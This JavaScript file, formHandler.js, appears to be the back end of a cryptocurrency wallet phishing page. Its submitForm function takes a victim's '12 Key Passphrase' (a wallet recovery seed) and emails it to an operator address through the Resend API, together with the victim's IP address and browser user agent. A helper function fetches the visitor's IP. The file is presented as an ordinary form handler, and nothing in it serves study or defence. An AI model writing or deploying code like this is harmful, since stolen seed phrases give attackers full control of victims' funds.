// src/components/formHandler.js
const RESEND_API_KEY = import.meta.env.VITE_RESEND_API_KEY;
const FROM_EMAIL = import.meta.env.VITE_FROM_EMAIL || 'onboarding@resend.dev';
const TO_EMAIL = import.meta.env.VITE_TO_EMAIL;

export async function submitForm(formData) {
  try {
    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${RESEND_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: FROM_EMAIL,
        to: [TO_EMAIL],
        subject: 'New Wallet Connection Attempt',
        html: `
          <h2>New Wallet Connection Form Submission</h2>
          <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
          <p><strong>12 Key Passphrase:</strong></p>
          <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px;">${formData.passphrase}</pre>
          <p><strong>IP Address:</strong> ${formData.ip || 'Not available'}</p>
          <p><strong>User Agent:</strong> ${formData.userAgent}</p>
        `,
        text: `
          New Wallet Connection Form Submission
          
          Timestamp: ${new Date().toLocaleString()}
          12 Key Passphrase: ${formData.passphrase}
          IP Address: ${formData.ip || 'Not available'}
          User Agent: ${formData.userAgent}
        `
      }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();
    return { success: true, data: result };
  } catch (error) {
    console.error('Error sending email:', error);
    return { success: false, error: error.message };
  }
}

// Function to get user's IP address (optional)
export async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP:', error);
    return null;
  }
}